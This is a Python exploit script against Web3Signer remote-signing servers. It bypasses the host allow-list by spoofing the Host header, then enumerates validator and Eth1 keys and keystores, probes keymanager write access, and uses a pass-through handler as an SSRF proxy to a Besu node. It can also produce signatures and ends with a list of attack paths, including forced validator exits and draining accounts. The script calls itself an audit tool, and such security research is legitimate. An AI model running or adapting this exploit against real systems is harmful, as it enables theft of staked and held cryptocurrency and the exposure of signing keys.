#!/usr/bin/env python3
"""
Web3Signer Full Enumeration — Auth Bypass + Complete Data Extraction
====================================================================
Bypasses HostAllowListHandler (Host header spoof) and enumerates EVERY
piece of information the signer exposes without authentication.

Uses http.client directly (NOT urllib) to guarantee the spoofed Host
header hits the wire exactly as intended — no proxy interference,
no header rewriting, no silent failures.

Usage:
  python3 enumerate_signer.py --target <HOST>:<PORT>
  python3 enumerate_signer.py --target <HOST>:<PORT> --output results.txt
  python3 enumerate_signer.py --target <HOST>:<PORT> --metrics-port 9001 --sign-proof
  python3 enumerate_signer.py --target <HOST>:<PORT> -v   # verbose — shows raw HTTP

IMPORTANT: Security audit tool. Only use against systems you are authorized to test.
"""

from __future__ import annotations

import argparse
import http.client
import json
import socket
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Raw HTTP via http.client — direct TCP, no proxy, Host header guaranteed
# ---------------------------------------------------------------------------

VERBOSE = False


def _parse_target(target: str) -> Tuple[str, int]:
    """Split host:port string."""
    if ":" in target:
        parts = target.rsplit(":", 1)
        return parts[0], int(parts[1])
    return target, 9000


def raw_request(
    target: str,
    method: str,
    path: str,
    body: Optional[str] = None,
    headers: Optional[Dict[str, str]] = None,
    timeout: int = 8,
) -> Tuple[int, str, Dict[str, str]]:
    """
    Send HTTP request via http.client.HTTPConnection directly.

    This bypasses urllib entirely — no proxy, no redirect following,
    no header rewriting. The Host header goes on the wire exactly as set.

    Returns (status_code, response_body, response_headers).
    On connection failure returns (0, error_message, {}).
    """
    host, port = _parse_target(target)

    if headers is None:
        headers = {}
    # Always spoof Host: localhost — this is the bypass (Gap 1)
    headers.setdefault("Host", "localhost")
    headers.setdefault("Accept", "application/json")
    if body is not None:
        headers.setdefault("Content-Type", "application/json")

    if VERBOSE:
        print(f"\n    >>> {method} http://{host}:{port}{path}")
        for k, v in headers.items():
            print(f"    >>> {k}: {v}")
        if body:
            print(f"    >>> Body: {body[:200]}")

    conn = None
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request(method, path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.getheaders())

        if VERBOSE:
            print(f"    <<< HTTP {resp.status} {resp.reason}")
            print(f"    <<< Body: {resp_body[:300]}")

        return resp.status, resp_body, resp_headers

    except socket.timeout:
        msg = f"CONNECTION TIMEOUT after {timeout}s to {host}:{port}"
        print(f"\n    [!] {msg}")
        return 0, msg, {}
    except ConnectionRefusedError:
        msg = f"CONNECTION REFUSED — {host}:{port} is not listening"
        print(f"\n    [!] {msg}")
        return 0, msg, {}
    except OSError as e:
        msg = f"NETWORK ERROR to {host}:{port} — {e}"
        print(f"\n    [!] {msg}")
        return 0, msg, {}
    except Exception as e:
        msg = f"ERROR: {type(e).__name__}: {e}"
        print(f"\n    [!] {msg}")
        return 0, msg, {}
    finally:
        if conn:
            conn.close()


def http_get(target: str, path: str, timeout: int = 8) -> Tuple[int, str]:
    """GET with Host: localhost bypass."""
    status, body, _ = raw_request(target, "GET", path, timeout=timeout)
    return status, body


def http_get_text(target: str, path: str, timeout: int = 8) -> Tuple[int, str]:
    """GET with Accept: text/plain."""
    status, body, _ = raw_request(
        target, "GET", path,
        headers={"Accept": "text/plain"},
        timeout=timeout,
    )
    return status, body


def http_post(target: str, path: str, body: Any, timeout: int = 10) -> Tuple[int, str]:
    """POST JSON with Host: localhost bypass."""
    data = json.dumps(body) if isinstance(body, dict) else str(body)
    status, resp, _ = raw_request(target, "POST", path, body=data, timeout=timeout)
    return status, resp


def http_delete(target: str, path: str, body: dict, timeout: int = 10) -> Tuple[int, str]:
    """DELETE JSON with Host: localhost bypass."""
    data = json.dumps(body)
    status, resp, _ = raw_request(target, "DELETE", path, body=data, timeout=timeout)
    return status, resp


def jsonrpc(target: str, method: str, params: Optional[list] = None,
            rpc_id: int = 1) -> Tuple[int, dict]:
    """JSON-RPC 2.0 call through root path."""
    body = {"jsonrpc": "2.0", "method": method, "params": params or [], "id": rpc_id}
    status, text = http_post(target, "/", body)
    try:
        return status, json.loads(text)
    except (json.JSONDecodeError, ValueError):
        return status, {"raw": text}


# ---------------------------------------------------------------------------
# Report builder
# ---------------------------------------------------------------------------

class Report:
    def __init__(self, target: str):
        self.target = target
        self.timestamp = datetime.now(timezone.utc).isoformat()
        self.sections = []  # type: List[Tuple[str, str]]

    def add(self, title: str, content: str):
        self.sections.append((title, content))

    def add_json(self, title: str, status: int, body: str):
        try:
            parsed = json.loads(body)
            pretty = json.dumps(parsed, indent=2)
        except (json.JSONDecodeError, TypeError, ValueError):
            pretty = body
        self.sections.append((title, "HTTP %d\n%s" % (status, pretty)))

    def render(self) -> str:
        w = 78
        lines = []
        lines.append("=" * w)
        lines.append("WEB3SIGNER FULL ENUMERATION REPORT")
        lines.append("Target:    %s" % self.target)
        lines.append("Generated: %s" % self.timestamp)
        lines.append("Method:    Host header spoof (Host: localhost) via raw http.client")
        lines.append("Auth:      NONE — zero authentication on all endpoints")
        lines.append("=" * w)

        for title, content in self.sections:
            lines.append("")
            lines.append("-" * w)
            lines.append("  %s" % title)
            lines.append("-" * w)
            for line in content.split("\n"):
                lines.append("  %s" % line)

        lines.append("")
        lines.append("=" * w)
        lines.append("END OF REPORT")
        lines.append("=" * w)
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Connectivity test — fail fast with clear error
# ---------------------------------------------------------------------------

def test_tcp(target: str) -> bool:
    """Raw TCP connect to verify the port is open BEFORE any HTTP."""
    host, port = _parse_target(target)
    print("[0/14] TCP connect to %s:%d ..." % (host, port), end=" ", flush=True)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        sock.close()
        print("OPEN")
        return True
    except socket.timeout:
        print("TIMEOUT — host exists but port %d not responding" % port)
        return False
    except ConnectionRefusedError:
        print("REFUSED — host is up but port %d is closed" % port)
        return False
    except socket.gaierror:
        print("DNS FAILURE — cannot resolve '%s'" % host)
        return False
    except OSError as e:
        print("NETWORK ERROR — %s" % e)
        return False


# ---------------------------------------------------------------------------
# Enumeration modules
# ---------------------------------------------------------------------------

def enum_upcheck(target: str, report: Report) -> bool:
    """GET /upcheck — liveness probe."""
    print("[1/14] Upcheck ...", end=" ", flush=True)
    status, body = http_get_text(target, "/upcheck")
    report.add("UPCHECK (/upcheck)", "HTTP %d\nResponse: %s" % (status, body.strip()))
    if status == 200:
        print("OK — %s" % body.strip())
        return True
    else:
        print("FAIL (HTTP %d) — %s" % (status, body[:120]))
        return False


def enum_healthcheck(target: str, report: Report):
    """GET /healthcheck — detailed component health."""
    print("[2/14] Health check ...", end=" ", flush=True)
    status, body = http_get(target, "/healthcheck")
    report.add_json("HEALTHCHECK (/healthcheck)", status, body)
    if status == 200:
        try:
            data = json.loads(body)
            info = ["Overall status: %s" % data.get("status", "unknown")]
            checks = data.get("checks", {})
            for name, entries in checks.items():
                if isinstance(entries, list):
                    for item in entries:
                        info.append("  %s: %s" % (name, item.get("status", "?")))
                else:
                    info.append("  %s: %s" % (name, entries))
            report.add("HEALTHCHECK — Parsed Components", "\n".join(info))
            print("OK — %s" % data.get("status", "?"))
        except (json.JSONDecodeError, ValueError, AttributeError):
            print("OK (non-JSON)")
    else:
        print("HTTP %d" % status)


def enum_metrics(host: str, metrics_port: int, report: Report):
    """GET /metrics on metrics port — Prometheus exposition."""
    print("[3/14] Prometheus metrics (port %d) ..." % metrics_port, end=" ", flush=True)
    target = "%s:%d" % (host, metrics_port)
    status, body = http_get_text(target, "/metrics")

    if status == 200:
        keywords = [
            "signing_signers_loaded",
            "signing_bls_signing_duration",
            "signing_bls_missing_identifier",
            "signing_secp256k1_signing_duration",
            "signing_secp256k1_missing_identifier",
            "web3signer_release",
            "process_start_time_seconds",
            "process_cpu_seconds_total",
            "jvm_memory_bytes_used",
            "jvm_memory_bytes_max",
            "jvm_threads_current",
            "vertx_http_server_active_connections",
            "vertx_http_server_request",
        ]
        interesting = {}
        for line in body.split("\n"):
            if line.startswith("#"):
                continue
            for kw in keywords:
                if kw in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        interesting[parts[0]] = parts[-1]

        summary = ["%s = %s" % (k, v) for k, v in interesting.items()]
        report.add(
            "PROMETHEUS METRICS — Key Values (port %d)" % metrics_port,
            "\n".join(summary) if summary else "(no matching metrics found)",
        )
        report.add("PROMETHEUS METRICS — Full Dump (port %d)" % metrics_port, body)
        print("OK (%d key metrics)" % len(interesting))
    elif status == 0:
        report.add("PROMETHEUS METRICS (port %d)" % metrics_port,
                    "NOT REACHABLE — %s" % body)
        print("NOT REACHABLE")
    else:
        report.add("PROMETHEUS METRICS (port %d)" % metrics_port,
                    "HTTP %d — %s" % (status, body[:200]))
        print("HTTP %d" % status)


def enum_eth2_pubkeys(target: str, report: Report) -> List[str]:
    """GET /api/v1/eth2/publicKeys — all loaded BLS validator keys."""
    print("[4/14] Eth2 public keys ...", end=" ", flush=True)
    status, body = http_get(target, "/api/v1/eth2/publicKeys")
    keys = []  # type: List[str]
    if status == 200:
        try:
            keys = json.loads(body)
            if isinstance(keys, list):
                lines = ["Total BLS public keys loaded: %d" % len(keys), ""]
                for i, k in enumerate(keys):
                    lines.append("  [%d] %s" % (i, k))
                report.add("ETH2 PUBLIC KEYS (/api/v1/eth2/publicKeys)", "\n".join(lines))
                print("OK (%d keys)" % len(keys))
            else:
                report.add_json("ETH2 PUBLIC KEYS", status, body)
                print("OK (unexpected format)")
        except (json.JSONDecodeError, ValueError):
            report.add("ETH2 PUBLIC KEYS", "HTTP %d\n%s" % (status, body))
            print("OK (non-JSON)")
    else:
        report.add("ETH2 PUBLIC KEYS",
                    "HTTP %d — not available (may be Eth1 mode)" % status)
        print("N/A (HTTP %d)" % status)
    return keys if isinstance(keys, list) else []


def enum_eth1_pubkeys(target: str, report: Report) -> List[str]:
    """GET /api/v1/eth1/publicKeys — all loaded secp256k1 keys."""
    print("[5/14] Eth1 public keys ...", end=" ", flush=True)
    status, body = http_get(target, "/api/v1/eth1/publicKeys")
    keys = []  # type: List[str]
    if status == 200:
        try:
            keys = json.loads(body)
            if isinstance(keys, list):
                lines = ["Total secp256k1 public keys loaded: %d" % len(keys), ""]
                for i, k in enumerate(keys):
                    lines.append("  [%d] %s" % (i, k))
                report.add("ETH1 PUBLIC KEYS (/api/v1/eth1/publicKeys)", "\n".join(lines))
                print("OK (%d keys)" % len(keys))
            else:
                report.add_json("ETH1 PUBLIC KEYS", status, body)
                print("OK (unexpected format)")
        except (json.JSONDecodeError, ValueError):
            report.add("ETH1 PUBLIC KEYS", "HTTP %d\n%s" % (status, body))
            print("OK (non-JSON)")
    else:
        report.add("ETH1 PUBLIC KEYS",
                    "HTTP %d — not available (may be Eth2 mode)" % status)
        print("N/A (HTTP %d)" % status)
    return keys if isinstance(keys, list) else []


def enum_keymanager(target: str, report: Report) -> List[dict]:
    """GET /eth/v1/keystores — keystore metadata (no auth despite OpenAPI bearerAuth)."""
    print("[6/14] Key Manager API ...", end=" ", flush=True)
    status, body = http_get(target, "/eth/v1/keystores")
    keystores = []  # type: List[dict]
    if status == 200:
        try:
            data = json.loads(body)
            keystores = data.get("data", [])
            lines = [
                "Total keystores: %d" % len(keystores),
                "NOTE: OpenAPI declares bearerAuth JWT — NOT IMPLEMENTED in code",
                "",
            ]
            for i, ks in enumerate(keystores):
                lines.append("  Keystore [%d]:" % i)
                lines.append("    validating_pubkey: %s" % ks.get("validating_pubkey", "N/A"))
                lines.append("    derivation_path:   %s" % ks.get("derivation_path", "N/A"))
                lines.append("    readonly:          %s" % ks.get("readonly", "N/A"))
                lines.append("")
            report.add("KEY MANAGER API (/eth/v1/keystores) — NO AUTH", "\n".join(lines))
            print("OK (%d keystores)" % len(keystores))
        except (json.JSONDecodeError, ValueError):
            report.add_json("KEY MANAGER API", status, body)
            print("OK (non-JSON)")
    else:
        report.add("KEY MANAGER API", "HTTP %d — %s" % (status, body[:200]))
        print("N/A (HTTP %d)" % status)

    # Probe write access (non-destructive: empty lists)
    del_status, del_body = http_delete(target, "/eth/v1/keystores", {"pubkeys": []})
    post_status, post_body = http_post(target, "/eth/v1/keystores",
                                       {"keystores": [], "passwords": []})
    access_lines = [
        "DELETE /eth/v1/keystores (empty pubkeys): HTTP %d" % del_status,
        "  Response: %s" % del_body[:200],
        "POST /eth/v1/keystores (empty import):    HTTP %d" % post_status,
        "  Response: %s" % post_body[:200],
        "",
        "DELETE accessible: %s" % ("YES" if del_status in (200, 400) else "NO"),
        "IMPORT accessible: %s" % ("YES" if post_status in (200, 400) else "NO"),
    ]
    report.add("KEY MANAGER API — Write Access Probe", "\n".join(access_lines))
    return keystores


def enum_high_watermark(target: str, report: Report):
    """GET /api/v1/eth2/highWatermark — slashing protection watermark."""
    print("[7/14] High watermark ...", end=" ", flush=True)
    status, body = http_get(target, "/api/v1/eth2/highWatermark")
    if status == 200:
        report.add_json("HIGH WATERMARK (/api/v1/eth2/highWatermark)", status, body)
        try:
            data = json.loads(body)
            print("OK (epoch=%s, slot=%s)" % (data.get("epoch", "?"), data.get("slot", "?")))
        except (json.JSONDecodeError, ValueError, AttributeError):
            print("OK")
    else:
        report.add("HIGH WATERMARK", "HTTP %d — %s" % (status, body[:200]))
        print("N/A (HTTP %d)" % status)


def enum_reload(target: str, report: Report):
    """GET /reload — reload status."""
    print("[8/14] Reload status ...", end=" ", flush=True)
    status, body = http_get(target, "/reload")
    report.add_json("RELOAD STATUS (/reload)", status, body)
    if status == 200:
        print("OK")
    else:
        print("HTTP %d" % status)


def enum_commitboost(target: str, report: Report):
    """GET /signer/v1/get_pubkeys — CommitBoost proxy key mappings."""
    print("[9/14] CommitBoost keys ...", end=" ", flush=True)
    status, body = http_get(target, "/signer/v1/get_pubkeys")
    if status == 200:
        report.add_json("COMMITBOOST KEYS (/signer/v1/get_pubkeys)", status, body)
        print("OK")
    else:
        report.add("COMMITBOOST KEYS",
                    "HTTP %d — CommitBoost API may be disabled" % status)
        print("N/A (HTTP %d)" % status)


def enum_eth1_accounts(target: str, report: Report) -> List[str]:
    """eth_accounts JSON-RPC — all Eth1 addresses."""
    print("[10/14] eth_accounts (JSON-RPC) ...", end=" ", flush=True)
    status, resp = jsonrpc(target, "eth_accounts")
    accounts = resp.get("result", [])
    if isinstance(accounts, list) and accounts:
        lines = ["Total Eth1 accounts: %d" % len(accounts), ""]
        for i, addr in enumerate(accounts):
            lines.append("  [%d] %s" % (i, addr))
        report.add("ETH1 ACCOUNTS (eth_accounts JSON-RPC)", "\n".join(lines))
        print("OK (%d accounts)" % len(accounts))
    elif status == 200:
        report.add("ETH1 ACCOUNTS", "Response: %s" % json.dumps(resp, indent=2))
        print("OK (empty or N/A)")
    else:
        report.add("ETH1 ACCOUNTS", "HTTP %d — %s" % (status, json.dumps(resp)[:200]))
        print("N/A (HTTP %d)" % status)
    return accounts if isinstance(accounts, list) else []


def enum_downstream_besu(target: str, report: Report) -> list:
    """Probe downstream Besu via SSRF (PassThroughHandler)."""
    print("[11/14] Downstream Besu recon (SSRF) ...", end=" ", flush=True)

    methods = [
        ("net_version", [], "Network ID"),
        ("eth_chainId", [], "Chain ID"),
        ("eth_blockNumber", [], "Current block number"),
        ("web3_clientVersion", [], "Besu client version"),
        ("eth_syncing", [], "Sync status"),
        ("net_peerCount", [], "Connected peer count"),
        ("eth_gasPrice", [], "Current gas price"),
        ("eth_mining", [], "Mining status"),
        ("txpool_status", [], "Transaction pool status"),
        ("admin_nodeInfo", [], "Full node info (enode, ports, protocols)"),
        ("admin_peers", [], "Connected peer details (IPs, enodes)"),
        ("eth_coinbase", [], "Coinbase address"),
        ("eth_hashrate", [], "Hash rate"),
        ("debug_metrics", [], "Debug metrics"),
        ("eth_protocolVersion", [], "Protocol version"),
    ]

    accessible = []
    denied = []
    for method, params, desc in methods:
        status, resp = jsonrpc(target, method, params)
        result = resp.get("result")
        error = resp.get("error")
        if status == 200 and result is not None:
            accessible.append((method, desc, result))
        else:
            err_msg = ""
            if isinstance(error, dict):
                err_msg = error.get("message", str(error))
            elif error:
                err_msg = str(error)
            denied.append((method, desc, err_msg or ("HTTP %d" % status)))

    lines = [
        "PassThroughHandler forwards ALL unregistered JSON-RPC methods",
        "to the downstream Besu node — open SSRF proxy.",
        "",
        "Accessible methods: %d/%d" % (len(accessible), len(methods)),
        "",
    ]

    if accessible:
        lines.append("ACCESSIBLE (data returned):")
        for method, desc, result in accessible:
            result_str = json.dumps(result, indent=2) if isinstance(result, (dict, list)) else str(result)
            if len(result_str) > 500:
                result_str = result_str[:500] + "\n  ... (truncated)"
            lines.append("  %s — %s:" % (method, desc))
            for rline in result_str.split("\n"):
                lines.append("    %s" % rline)
            lines.append("")

    if denied:
        lines.append("DENIED/UNAVAILABLE:")
        for method, desc, err in denied:
            lines.append("  %s — %s: %s" % (method, desc, err[:100]))

    report.add("DOWNSTREAM BESU NODE — SSRF via PassThroughHandler", "\n".join(lines))
    print("OK (%d accessible, %d denied)" % (len(accessible), len(denied)))
    return accessible


def enum_eth1_balances(target: str, accounts: List[str], report: Report):
    """Query balance of each Eth1 account via SSRF."""
    if not accounts:
        return
    print("[12/14] Account balances (via SSRF) ...", end=" ", flush=True)
    lines = ["Account balances via eth_getBalance through PassThroughHandler:", ""]
    total_wei = 0
    for addr in accounts:
        status, resp = jsonrpc(target, "eth_getBalance", [addr, "latest"])
        result = resp.get("result")
        if result:
            try:
                wei = int(result, 16)
                eth_val = wei / 1e18
                total_wei += wei
                lines.append("  %s: %.6f ETH (%d wei)" % (addr, eth_val, wei))
            except (ValueError, TypeError):
                lines.append("  %s: %s" % (addr, result))
        else:
            lines.append("  %s: query failed (%s)" % (addr, resp))

    total_eth = total_wei / 1e18
    lines.append("")
    lines.append("TOTAL BALANCE EXPOSED: %.6f ETH (%d wei)" % (total_eth, total_wei))
    lines.append("All drainable via eth_sendTransaction (signs + broadcasts)")
    report.add("ETH1 ACCOUNT BALANCES — Assets At Risk", "\n".join(lines))
    print("OK (total: %.6f ETH)" % total_eth)


def enum_sign_proof(target: str, eth2_keys: List[str],
                    eth1_accounts: List[str], report: Report):
    """Prove unrestricted signing access."""
    print("[13/14] Signing proof ...", end=" ", flush=True)
    lines = [
        "Demonstrating unrestricted signing access (= owning the key).",
        "",
    ]
    signed = 0

    # Eth2: sign RANDAO_REVEAL (harmless, proves BLS key access)
    if eth2_keys:
        pubkey = eth2_keys[0]
        body = {
            "type": "RANDAO_REVEAL",
            "fork_info": {
                "fork": {
                    "previous_version": "0x04000000",
                    "current_version": "0x04000000",
                    "epoch": "0",
                },
                "genesis_validators_root":
                    "0x0000000000000000000000000000000000000000000000000000000000000000",
            },
            "randao_reveal": {"epoch": "0"},
        }
        status, resp = http_post(target, "/api/v1/eth2/sign/%s" % pubkey, body)
        if status == 200:
            try:
                sig = json.loads(resp).get("signature", resp)
            except (json.JSONDecodeError, ValueError, AttributeError):
                sig = resp
            lines.append("BLS SIGNING PROOF (RANDAO_REVEAL):")
            lines.append("  Pubkey:    %s" % pubkey)
            lines.append("  Signature: %s" % sig)
            lines.append("  Status:    HTTP %d" % status)
            lines.append("  Auth:      NONE")
            lines.append("")
            signed += 1
        else:
            lines.append("BLS signing: HTTP %d — %s" % (status, resp[:200]))
            lines.append("")

    # Eth1: eth_sign (harmless test data, proves secp256k1 key access)
    if eth1_accounts:
        addr = eth1_accounts[0]
        test_msg = "0x" + "41" * 32
        status, resp = jsonrpc(target, "eth_sign", [addr, test_msg])
        result = resp.get("result")
        if result:
            lines.append("SECP256K1 SIGNING PROOF (eth_sign):")
            lines.append("  Address:   %s" % addr)
            lines.append("  Message:   %s" % test_msg)
            lines.append("  Signature: %s" % result)
            lines.append("  Auth:      NONE")
            lines.append("")
            signed += 1
        else:
            lines.append("eth_sign: %s" % json.dumps(resp)[:200])
            lines.append("")

    if signed:
        lines.append("RESULT: %d signing proof(s) — ZERO AUTHENTICATION" % signed)
    else:
        lines.append("No keys available for signing proof")

    report.add("SIGNING PROOF — Private Key Access Demonstration", "\n".join(lines))
    if signed:
        print("OK (%d proof(s))" % signed)
    else:
        print("N/A (no keys)")


def enum_summary(target: str, eth2_keys: List[str], eth1_accounts: List[str],
                 keystores: List[dict], besu_methods: list, report: Report):
    """Final attack surface summary."""
    print("[14/14] Summary ...", end=" ", flush=True)
    lines = [
        "TOTAL INFORMATION EXPOSED WITHOUT AUTHENTICATION:",
        "",
        "  BLS validator public keys:     %d" % len(eth2_keys),
        "  Secp256k1 Eth1 accounts:       %d" % len(eth1_accounts),
        "  Keystore metadata entries:      %d" % len(keystores),
        "  Besu SSRF methods accessible:   %d" % len(besu_methods),
        "",
        "ASSETS AT RISK:",
        "",
    ]

    if eth2_keys:
        lines.append("  Eth2 Validators: %d" % len(eth2_keys))
        lines.append("  Staked ETH:      %d ETH (32 per validator)" % (len(eth2_keys) * 32))
        lines.append("  Attack vectors:")
        lines.append("    - VOLUNTARY_EXIT: force-exit all validators (irreversible)")
        lines.append("    - VALIDATOR_REGISTRATION: redirect MEV fees to attacker")
        lines.append("    - Sign 10/13 types without any slashing check")
        lines.append("    - DELETE keystores: cause inactivity penalties")
        lines.append("")

    if eth1_accounts:
        lines.append("  Eth1 Accounts: %d" % len(eth1_accounts))
        lines.append("  Attack vectors:")
        lines.append("    - eth_sendTransaction: sign AND broadcast (direct theft)")
        lines.append("    - eth_signTransaction: sign for later broadcast")
        lines.append("    - eth_sign / eth_signTypedData: sign arbitrary data")
        lines.append("    - SSRF: full access to downstream Besu node")
        lines.append("")

    lines.append("BYPASS METHOD:")
    lines.append("  HTTP header: Host: localhost")
    lines.append("  HostAllowListHandler reads Host header (client-controlled), not source IP")
    lines.append("  Zero auth middleware after Host check passes")

    report.add("ATTACK SURFACE SUMMARY", "\n".join(lines))
    print("OK")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Web3Signer Full Enumeration — Auth Bypass + Data Extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 enumerate_signer.py --target 10.0.0.5:9000
  python3 enumerate_signer.py --target 10.0.0.5:9000 -v --sign-proof
  python3 enumerate_signer.py --target 10.0.0.5:9000 --output report.txt
  python3 enumerate_signer.py --target web3signer:9000 --metrics-port 9001
""",
    )
    parser.add_argument("--target", required=True,
                        help="Web3Signer host:port (e.g. 10.0.0.5:9000)")
    parser.add_argument("--metrics-port", type=int, default=9001,
                        help="Prometheus metrics port (default: 9001)")
    parser.add_argument("--sign-proof", action="store_true",
                        help="Include signing proof (signs test data to prove key access)")
    parser.add_argument("--output", default="web3signer_enumeration.txt",
                        help="Output file (default: web3signer_enumeration.txt)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show raw HTTP requests/responses")

    args = parser.parse_args()

    global VERBOSE
    VERBOSE = args.verbose

    target = args.target
    host = _parse_target(target)[0]

    print("=" * 70)
    print("Web3Signer Full Enumeration — Auth Bypass (http.client direct)")
    print("=" * 70)
    print("Target:       %s" % target)
    print("Metrics port: %d" % args.metrics_port)
    print("Sign proof:   %s" % ("YES" if args.sign_proof else "No"))
    print("Verbose:      %s" % ("YES" if args.verbose else "No"))
    print("Output:       %s" % args.output)
    print("HTTP lib:     http.client (direct TCP, no proxy, no urllib)")
    print("Bypass:       Host: localhost → HostAllowListHandler.java")
    print("=" * 70)

    report = Report(target)

    # Step 0: Raw TCP test — fail fast with clear error
    if not test_tcp(target):
        print("\n[FATAL] Cannot reach %s — check host/port/firewall." % target)
        report.add("TCP CONNECTIVITY", "FAILED — target not reachable")
        with open(args.output, "w") as f:
            f.write(report.render())
        print("[*] Partial report saved to %s" % args.output)
        sys.exit(1)

    # Step 1: Upcheck — verify HTTP layer + Host bypass
    if not enum_upcheck(target, report):
        print("\n[FATAL] TCP is open but /upcheck failed.")
        print("  Possible causes:")
        print("  - Not a Web3Signer (wrong port?)")
        print("  - Host: localhost not in --http-host-allowlist")
        print("  - TLS required (try HTTPS)")
        report.add("HOST BYPASS", "FAILED — Host: localhost rejected or wrong service")
        with open(args.output, "w") as f:
            f.write(report.render())
        print("[*] Partial report saved to %s" % args.output)
        sys.exit(1)

    print("\n[+] HOST BYPASS CONFIRMED — Host: localhost accepted\n")

    # Steps 2-14: Full enumeration
    enum_healthcheck(target, report)
    enum_metrics(host, args.metrics_port, report)
    eth2_keys = enum_eth2_pubkeys(target, report)
    eth1_keys = enum_eth1_pubkeys(target, report)
    keystores = enum_keymanager(target, report)
    enum_high_watermark(target, report)
    enum_reload(target, report)
    enum_commitboost(target, report)
    eth1_accounts = enum_eth1_accounts(target, report)
    besu_methods = enum_downstream_besu(target, report)
    enum_eth1_balances(target, eth1_accounts, report)

    if args.sign_proof:
        enum_sign_proof(target, eth2_keys, eth1_accounts, report)
    else:
        report.add("SIGNING PROOF", "Skipped (use --sign-proof to enable)")
        print("[13/14] Signing proof ... SKIPPED (use --sign-proof)")

    enum_summary(target, eth2_keys, eth1_accounts, keystores, besu_methods, report)

    # Write report
    report_text = report.render()
    with open(args.output, "w") as f:
        f.write(report_text)

    print()
    print("=" * 70)
    print("REPORT SAVED: %s" % args.output)
    print("Sections: %d | Size: %d bytes" % (len(report.sections), len(report_text)))
    print("=" * 70)
    print()
    print(report_text)


if __name__ == "__main__":
    main()
